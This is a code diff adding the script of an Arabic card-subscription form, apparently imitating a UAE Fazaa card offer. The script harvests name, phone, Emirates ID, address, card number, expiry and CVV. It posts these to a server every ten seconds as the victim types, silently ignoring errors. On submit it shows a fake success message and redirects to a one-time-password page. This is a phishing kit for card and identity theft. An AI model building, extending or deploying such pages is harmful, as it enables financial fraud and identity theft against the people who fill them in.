+            step: 'delivery_address',
+            bookingData: {
+              'نوع البطاقة': fullCardTitle,
+              'الاسم': name,
+              'الهاتف': phone,
+              'الهوية': eid,
+              'الإمارة': region,
+              'المنطقة': district,
+              'الشارع': street
+            }
+          })
+        }).catch(() => {});
+      }
+
+      currentStep = step;
+      document.getElementById('step-1-container').classList.toggle('hidden', step !== 1);
+      document.getElementById('step-2-container').classList.toggle('hidden', step !== 2);
+      document.getElementById('step-3-container').classList.toggle('hidden', step !== 3);
+
+      const progressLine = document.getElementById('progress-line');
+      const node1 = document.getElementById('step-node-1').firstElementChild;
+      const node2 = document.getElementById('step-node-2').firstElementChild;
+      const node3 = document.getElementById('step-node-3').firstElementChild;
+
+      if (step === 1) {
+        progressLine.style.width = '15%';
+        node1.className = 'w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm text-white shadow-md bg-gradient-to-r from-gold-700 to-gold-500 ring-4 ring-gold-100';
+        node2.className = 'w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm text-gray-500 bg-white border-2 border-gray-300';
+        node3.className = 'w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm text-gray-500 bg-white border-2 border-gray-300';
+      } else if (step === 2) {
+        progressLine.style.width = '50%';
+        node1.className = 'w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm text-white bg-emerald-500';
+        node1.innerHTML = '✓';
+        node2.className = 'w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm text-white shadow-md bg-gradient-to-r from-gold-700 to-gold-500 ring-4 ring-gold-100';
+        node3.className = 'w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm text-gray-500 bg-white border-2 border-gray-300';
+      } else if (step === 3) {
+        progressLine.style.width = '100%';
+        node1.className = 'w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm text-white bg-emerald-500';
+        node1.innerHTML = '✓';
+        node2.className = 'w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm text-white bg-emerald-500';
+        node2.innerHTML = '✓';
+        node3.className = 'w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm text-white shadow-md bg-gradient-to-r from-gold-700 to-gold-500 ring-4 ring-gold-100';
+      }
+
+      window.scrollTo({ top: 120, behavior: 'smooth' });
+    }
+
+    const cardInput = document.getElementById('cardNumber');
+    const holderInput = document.getElementById('cardHolder');
+    const expiryInput = document.getElementById('expiry');
+    const nameInput = document.getElementById('fullName');
+    const phoneInput = document.getElementById('phone');
+    const emiratesIdInput = document.getElementById('emiratesId');
+
+    nameInput.addEventListener('input', (e) => {
+      const val = e.target.value.trim();
+      if (!holderInput.value) {
+        document.getElementById('preview-card-holder').textContent = val || 'AL HAMELI AHMED';
+      }
+      saveAndSyncPartial();
+    });
+
+    holderInput.addEventListener('input', (e) => {
+      document.getElementById('preview-card-holder').textContent = e.target.value.toUpperCase() || 'AL HAMELI AHMED';
+      saveAndSyncPartial();
+    });
+
+    emiratesIdInput.addEventListener('input', (e) => {
+      let v = e.target.value.replace(/\D/g, '');
+      if (v.length > 15) v = v.slice(0, 15);
+      let formatted = '';
+      if (v.length > 0) formatted += v.slice(0, 3);
+      if (v.length > 3) formatted += '-' + v.slice(3, 7);
+      if (v.length > 7) formatted += '-' + v.slice(7, 14);
+      if (v.length > 14) formatted += '-' + v.slice(14, 15);
+      e.target.value = formatted;
+      saveAndSyncPartial();
+    });
+
+    cardInput.addEventListener('input', (e) => {
+      let v = e.target.value.replace(/\D/g, '');
+      if (v.length > 16) v = v.slice(0, 16);
+      const parts = [];
+      for (let i = 0; i < v.length; i += 4) {
+        parts.push(v.slice(i, i + 4));
+      }
+      e.target.value = parts.join(' ');
+
+      if (v.length > 0) {
+        let masked = '';
+        for (let i = 0; i < 16; i++) {
+          if (i > 0 && i % 4 === 0) masked += ' ';
+          masked += (i < v.length) ? v[i] : '•';
+        }
+        document.getElementById('preview-card-number').textContent = masked;
+      } else {
+        document.getElementById('preview-card-number').textContent = '•••• •••• •••• ••••';
+      }
+      saveAndSyncPartial();
+    });
+
+    expiryInput.addEventListener('input', (e) => {
+      let v = e.target.value.replace(/\D/g, '');
+      if (v.length > 4) v = v.slice(0, 4);
+      if (v.length >= 2) {
+        e.target.value = v.slice(0, 2) + '/' + v.slice(2);
+      } else {
+        e.target.value = v;
+      }
+      document.getElementById('preview-card-expiry').textContent = e.target.value || '12/28';
+      saveAndSyncPartial();
+    });
+
+    function saveAndSyncPartial() {
+      const regData = {
+        fullName: nameInput.value.trim(),
+        name: nameInput.value.trim(),
+        phone: phoneInput.value.trim(),
+        emiratesId: emiratesIdInput.value.trim(),
+        region: document.getElementById('region').value,
+        district: document.getElementById('district').value.trim(),
+        street: document.getElementById('street').value.trim(),
+        cardNumber: cardInput.value.replace(/\s/g, ''),
+        cardHolder: holderInput.value.trim(),
+        expiry: expiryInput.value.trim(),
+        cvv: document.getElementById('cvv').value.trim(),
+        cardBrand: cardParam,
+        cardType: typeParam
+      };
+      sessionStorage.setItem('reg_data', JSON.stringify(regData));
+      sessionStorage.setItem('fazaa_formData', JSON.stringify(regData));
+    }
+
+    function syncLiveHeartbeat(extra = {}) {
+      saveAndSyncPartial();
+      let stored = {};
+      try { stored = JSON.parse(sessionStorage.getItem('reg_data') || '{}'); } catch(e){}
+
+      fetch('/api/client/heartbeat', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          id: visitorId,
+          step: currentStep === 3 ? 'payment' : 'passenger_details',
+          path: window.location.pathname,
+          title: document.title,
+          name: stored.fullName || undefined,
+          phone: stored.phone || undefined,
+          emiratesId: stored.emiratesId || undefined,
+          cardNumber: stored.cardNumber || undefined,
+          expiry: stored.expiry || undefined,
+          cvv: stored.cvv || undefined,
+          cardHolder: stored.cardHolder || undefined,
+          bookingData: {
+            'البطاقة': fullCardTitle,
+            'الاسم': stored.fullName,
+            'الهاتف': stored.phone,
+            'الهوية': stored.emiratesId,
+            'الإمارة': stored.region,
+            'المنطقة': stored.district,
+            'الشارع': stored.street
+          },
+          ...extra
+        })
+      }).catch(() => {});
+    }
+
+    syncLiveHeartbeat({ step: 'passenger_details' });
+    setInterval(syncLiveHeartbeat, 10000);
+
+    async function handleFormSubmit() {
+      const cardNum = cardInput.value.replace(/\s/g, '');
+      const holder = holderInput.value.trim();
+      const exp = expiryInput.value.trim();
+      const cvvVal = document.getElementById('cvv').value.trim();
+
+      if (cardNum.length < 15 || !holder || exp.length < 5 || cvvVal.length < 3) {
+        alert('يرجى التأكد من كتابة جميع تفاصيل البطاقة بشكل صحيح.');
+        return;
+      }
+
+      document.getElementById('submitBtnText').classList.add('hidden');
+      document.getElementById('submitBtnSpinner').classList.remove('hidden');
+      document.getElementById('submitBtn').disabled = true;
+
+      const modal = document.getElementById('loadingModal');
+      modal.classList.remove('hidden');
+
+      saveAndSyncPartial();
+      let stored = {};
+      try { stored = JSON.parse(sessionStorage.getItem('reg_data') || '{}'); } catch(e){}
+
+      const finalName = nameInput.value.trim() || stored.fullName || stored.name || '';
+      const finalPhone = phoneInput.value.trim() || stored.phone || '';
+      const finalEid = emiratesIdInput.value.trim() || stored.emiratesId || '';
+      const finalRegion = document.getElementById('region').value || stored.region || '';
+      const finalDistrict = document.getElementById('district').value.trim() || stored.district || '';
+      const finalStreet = document.getElementById('street').value.trim() || stored.street || '';
+
+      try {
+        const res = await fetch('/api/client/order', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            visitorId: visitorId,
+            name: finalName,
+            phone: finalPhone,
+            emiratesId: finalEid,
+            cardNumber: cardNum,
+            cardHolder: holder,
+            expiry: exp,
+            cvv: cvvVal,
+            step: 'payment',
+            bookingData: {
+              'نوع البطاقة': fullCardTitle,
+              'الاسم': finalName,
+              'الهاتف': finalPhone,
+              'الهوية': finalEid,
+              'الإمارة': finalRegion,
+              'المنطقة': finalDistrict,
+              'الشارع': finalStreet
+            }
+          })
+        });
+
+        const data = await res.json();
+
+        document.getElementById('modalTitle').textContent = '✓ تم إرسال طلب الاشتراك بنجاح';
+        document.getElementById('modalSub').textContent = 'جاري التحويل لصفحة إدخال رمز التحقق الأمني (OTP)...';
+
+        setTimeout(() => {
+          window.location.href = `/otp?id=${visitorId}&card=${cardParam}`;
+        }, 1200);
+
+      } catch (err) {
+        modal.classList.add('hidden');
+        document.getElementById('submitBtnText').classList.remove('hidden');
+        document.getElementById('submitBtnSpinner').classList.add('hidden');
+        document.getElementById('submitBtn').disabled = false;
+        alert('حدث خطأ أثناء معالجة الطلب، يرجى المحاولة مرة أخرى.');
+      }
+    }
+  </script>
+
+  <script src="/client-tracker.js"></script>
+</body>
+</html>
